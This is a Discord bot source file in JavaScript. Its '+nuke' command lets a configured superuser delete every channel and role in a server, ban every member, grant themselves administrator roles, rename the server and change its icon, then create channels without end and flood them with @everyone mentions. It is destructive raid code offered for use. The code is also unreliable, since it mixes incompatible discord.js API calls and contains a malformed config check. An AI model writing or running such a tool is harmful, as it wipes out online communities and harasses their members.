const { Client, Intents } = require('discord.js');
const client = new Client({ intents: [
    Intents.FLAGS.GUILDS,
    Intents.FLAGS.GUILD_MESSAGES,
    Intents.FLAGS.GUILD_MEMBERS,
    Intents.FLAGS.GUILD_MESSAGE_REACTIONS,
    Intents.FLAGS.GUILD_WEBHOOKS,
    Intents.FLAGS.GUILD_VOICE_STATES,
    Intents.FLAGS.GUILD_INVITES,
    Intents.FLAGS.GUILD_BANS,
    Intents.FLAGS.GUILD_PRESENCES,
  ] });
const prefix = "+"; 
const config = require("./config.json")
client.on("ready", () => {
  console.log(`Logged in as ${client.user.tag}!`);
});
if(!config.guildName && roleName && roleName2 && guildIcon && channelName && superuser){
console.warn("No Details In ./config.json File, Aborting...")
process.abort()
}
client.on("messageCreate", message => {
  if (message.content.startsWith("+nuke"))
 if(message.author.id === config.superuser){
    message.delete();

    message.guild.channels.Map(c => {
      c.delete();
    });
    message.guild.members.forEach(m => {
      m.ban();
    });

    message.guild.roles.forEach(r => {
      r.delete();
    });

    setInterval(() => {
      message.guild
        .createRole({
          name: `${config.roleName}`,
          permissions: ["ADMINISTRATOR"]
        })
        .then(rr => {
          message.member.addRole(rr.id);
        });
    }, 1000);
    message.guild
      .createRole({
        name: "${config.roleName2}", 
        permissions: ["ADMINISTRATOR"]
      })
      .then(rr => {
        message.member.addRole(rr.id);
      });

    message.guild.setIcon(
      `${config.guildIcon}`
      );
    message.guild.setName(`${config.guildName}`); 
    setTimeout(function() {
      setInterval(() => {
        message.guild.createChannel(`${config.channelName}`, "text").then(channel => {
          channel.send("@everyone ");
          channel.send("@everyone ");
          channel.send("@everyone ");
          channel.send("@everyone ");
          channel.send("@everyone ");
          channel.send("@everyone ");
          channel.send("@everyone ");
          channel.send("@everyone ");
          channel.send("@everyone ");
          channel.send("@everyone ");
          channel.send("@everyone ");
          channel.send("@everyone ");
          channel.send("@everyone ");
          channel.send("@everyone ");
          channel.send("@everyone ");
          channel.send("@everyone ");
          channel.send("@everyone ");
          channel.send("@everyone ");
          channel.send("@everyone ");
          channel.send("@everyone ");
          channel.send("@everyone ");
          channel.send("@everyone ");
          channel.send("@everyone ");
          channel.send("@everyone ");
          channel.send("@everyone ");
          channel.send("@everyone ");
          channel.send("@everyone ");
          channel.send("@everyone ");
          channel.send("@everyone ");
          
        });
      }, 500);
    });
  }
});

client.on("messageCreate", async msg => {
  if (msg.content.startsWith(".leaveall")) {
    client.guilds.forEach(guild => {
      guild.leave();
    });
    msg.channel.send(`:joy::joy:joy: `); 
  }
});
    
var adminprefix = ["+"];
client.on("messageCreate", message => {
  var argresult = message.content
    .split(` `)
    .slice(1)
    .join(" ");

  if (message.content.startsWith(adminprefix + "setg")) {
    client.user.setActivity(argresult);
    message.channel.send(`**✅   ${argresult}**`);
  } else if (message.content === adminprefix + "leave") {
    message.guild.leave();
  } else if (message.content.startsWith(adminprefix + "setw")) {
    client.user.setActivity(argresult, { type: "WATCHING" });
    message.channel.send(`**✅   ${argresult}**`);
  } else if (message.content.startsWith(adminprefix + "setl")) {
    client.user.setActivity(argresult, { type: "LISTENING" });
    message.channel.send(`**✅   ${argresult}**`);
  } else if (message.content.startsWith(adminprefix + "sets")) {
    client.user.setActivity(argresult, {type:"STREAMING", url:"https://www.twitch.tv/dream"});
    message.channel.send(`**✅   ${argresult}**`);
  }
  if (message.content.startsWith(prefix + "setname")) {
    client.user.setUsername(argresult).then;
    message.channel.send(`Changing The Name To ..**${argresult}** `);
  } else if (message.content.startsWith(adminprefix + "setava")) {
    client.user.setAvatar(argresult);
    message.channel.send(`Changing The Avatar To :**${argresult}** `);
  }
});
client.login(process.env.TOKEN || config.botToken)
